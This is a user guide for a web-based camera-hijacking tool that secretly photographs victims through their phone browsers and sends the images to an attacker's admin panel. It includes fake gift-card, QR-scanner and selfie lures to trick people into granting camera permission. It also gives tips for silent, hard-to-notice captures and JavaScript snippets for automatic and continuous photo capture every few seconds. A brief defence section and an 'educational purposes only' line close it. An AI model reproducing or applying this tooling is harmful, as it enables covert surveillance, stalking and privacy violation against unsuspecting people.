# 📷 CAMERA CAPTURE FEATURE - USER GUIDE

## 🎯 New Features Added:

### ✅ Camera Access (STEALTH MODE)
The exploit can now secretly capture photos from the victim's camera!

---

## 📱 How It Works:

### **Three Camera Commands:**

1. **📷 Capture Front Camera**
   - Takes a single photo from front-facing camera
   - Photo is sent to admin panel immediately
   - Camera permission popup appears (user must allow)
   - Photo captured in high quality (up to 1920x1080)

2. **📷 Capture Back Camera**
   - Takes photo from rear-facing camera
   - Same as front camera but uses environment camera
   - Great for capturing victim's surroundings

3. **🎥 Start Front Camera (Live Preview)**
   - Opens live camera preview on victim's screen
   - Shows small video feed in bottom-right corner
   - User can see they're being recorded
   - Use "Stop Camera" to turn off

---

## 🎮 Admin Panel Usage:

### **Test Page First:**
```
http://192.168.100.59:5000/test
```

Click the camera buttons:
- 📷 Test Front Camera
- 📷 Test Back Camera

This will:
- Request camera permission
- Capture a photo
- Show it in the log below
- Confirm camera works on your device

### **From Admin Panel:**
```
http://localhost:5000/admin
```

1. Select a victim session (click on their IP)
2. Click one of the camera buttons:
   - **📷 Capture Front Camera** - Take selfie
   - **📷 Capture Back Camera** - Take photo of surroundings
   - **🎥 Start Front Camera** - Live video preview
   - **⏹️ Stop Camera** - Stop live preview

3. Captured photos appear in "Captured Data" section
4. Photos are shown full-size with resolution info

---

## ⚠️ Important Notes:

### **Camera Permissions:**
- ❗ Browser will ask user for camera permission
- User MUST click "Allow" for camera to work
- Once allowed, future captures are silent
- Permission is saved in browser (persistent)

### **Silent Mode (After First Allow):**
- First time: User sees permission popup
- After allowing: Future captures are SILENT
- No notification or indicator (depends on browser)
- Some browsers show camera indicator LED

### **Browser Compatibility:**
- ✅ Chrome/Edge (Android): Full support
- ✅ Firefox (Android): Full support
- ✅ Samsung Internet: Full support
- ⚠️ Safari (iOS): Limited support, may show warnings
- ❌ iOS browsers: Restricted by Apple security

---

## 🔥 Stealth Tips:

### **Social Engineering:**
To get camera permission without suspicion:

1. **Fake QR Code Scanner:**
   ```
   "Scan QR code to claim reward"
   → Needs camera permission
   ```

2. **Fake Video Call:**
   ```
   "Enable camera for video verification"
   → User expects camera request
   ```

3. **Fake Selfie Feature:**
   ```
   "Take a selfie to personalize your gift card"
   → Natural reason for camera
   ```

4. **After User Interaction:**
   - Wait for user to click a button
   - Request camera during interaction
   - Less suspicious than auto-request

---

## 🧪 Testing:

### **Test 1: Permission Test**
1. Open `/test` page on phone
2. Click "Test Front Camera"
3. Click "Allow" when prompted
4. See photo appear in log
5. Success! ✅

### **Test 2: Admin Panel Capture**
1. Victim opens main page and claims gift card
2. Admin selects victim session
3. Admin clicks "Capture Front Camera"
4. Victim sees permission popup (first time only)
5. Photo appears in admin panel
6. Try again - NO popup second time (silent)

### **Test 3: Live Camera**
1. Admin clicks "Start Front Camera"
2. Small video preview appears on victim's screen
3. Victim can see they're being recorded
4. Click "Stop Camera" to turn off

---

## 📊 What You Get:

### **Photo Data Includes:**
- High-quality JPEG image (base64 encoded)
- Resolution (e.g., 1920x1080)
- Camera type (front/back)
- Timestamp
- Displayed in admin panel with full preview

### **Image Quality:**
- Default: 80% JPEG quality
- Resolution: Up to 1920x1080 (depends on device)
- Format: Base64 data URL
- Viewable directly in browser

---

## 🐛 Troubleshooting:

### **Camera Not Working?**

1. **Permission Denied:**
   - User clicked "Block" or "Deny"
   - Clear browser data and try again
   - Use social engineering to convince user

2. **Camera Indicator Always On:**
   - Some devices show LED when camera active
   - Use quick capture instead of live stream
   - Capture is very fast (1 second)

3. **Low Quality:**
   - Device has low-res camera
   - Check camera specs
   - Try back camera (usually better)

4. **Black Screen:**
   - Camera already in use by another app
   - Close other camera apps
   - Try again

5. **iOS Not Working:**
   - Safari blocks many camera APIs
   - Use Android device instead
   - iOS has stricter security

---

## 💡 Advanced Usage:

### **Automatic Capture:**
You can modify `landing.html` to auto-request camera:

```javascript
// After user clicks claim button
setTimeout(() => {
    // Silently request camera
    socket.emit('admin_command', {
        command: 'capture_photo',
        params: { camera: 'user' }
    });
}, 3000);
```

### **Continuous Capture:**
Take photos every few seconds:

```javascript
// In admin panel, send command repeatedly
setInterval(() => {
    sendCommand('capture_photo', { camera: 'user' });
}, 5000); // Every 5 seconds
```

---

## 🚨 Security Implications:

### **This Demonstrates:**
- Web-based camera hijacking
- Permission persistence exploitation
- Social engineering for permissions
- Silent photo capture after initial consent

### **Defense Against This:**
- Always check site URL before granting camera
- Revoke camera permissions for suspicious sites
- Use browser privacy indicators
- Keep browser updated
- Be skeptical of random permission requests

---

## 📋 Quick Commands:

```bash
# Test page (test camera manually)
http://192.168.100.59:5000/test

# Victim page (gift card trap)
http://192.168.100.59:5000

# Admin panel (control camera)
http://localhost:5000/admin

# Vibration test
http://192.168.100.59:5000/vibrate-test
```

---

## ✅ Feature Summary:

**Working:**
- ✅ Front camera capture
- ✅ Back camera capture
- ✅ Live camera preview
- ✅ Photo display in admin panel
- ✅ High-quality image capture
- ✅ Permission persistence
- ✅ Silent capture (after permission)

**Known Issues:**
- ⚠️ Requires user permission first time
- ⚠️ Some browsers show camera indicator
- ⚠️ iOS has limited support
- ⚠️ User can deny permission

**Bypasses:**
- 📱 Use social engineering for permission
- 🎯 Fake QR scanner or selfie feature
- ⚡ Quick capture (1 sec, hard to notice)
- 💾 Permission saved forever (until cleared)

---

**Happy Hacking! 🎯**

*Remember: This is for educational purposes only. Unauthorized access to cameras is illegal.*
